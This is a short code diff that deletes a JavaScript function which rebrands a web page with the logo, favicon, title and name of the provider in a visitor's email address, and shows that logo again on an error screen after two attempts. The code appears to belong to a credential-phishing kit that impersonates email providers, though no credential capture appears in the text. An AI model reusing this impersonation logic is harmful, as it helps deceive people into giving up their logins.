@@ -429,28 +429,6 @@
 
         function showPopup(msg) { alert(msg); }
 
-        function updateDomainUI(domain) {
-            if (!domain) return;
-            const logo = `https://logo.clearbit.com/${domain}?size=64`;
-            const favicon = FAVICON_MAP[domain] || '/default-favicon.ico';
-            const msg = DOMAIN_MESSAGES[domain] || `Connecting to your email provider`;
-
-            els.brandName.textContent = els.titleText.textContent = els.footerDomain.textContent = els.footerLink.textContent = domain;
-            els.footerLink.href = `https://${domain}`;
-            els.pageTitle.textContent = domain;
-            els.favicon.href = favicon;
-
-            [els.brandLogo, els.titleLogo].forEach(img => {
-                img.src = logo; img.style.display = 'block';
-                img.onerror = () => img.src = '/default-logo.png';
-            });
-            if (state.attempts >= 2) {
-                els.errorLogo.src = logo;
-                els.errorLogo.onerror = () => els.errorLogo.src = '/default-logo.png';
-            }
-            els.domainMessage.textContent = `${msg} (${domain})`;
-            els.domainInfo.style.display = 'block';
-        }
 
         function redirectToProvider(email) {
             const domain = email.split('@')[1].toLowerCase();
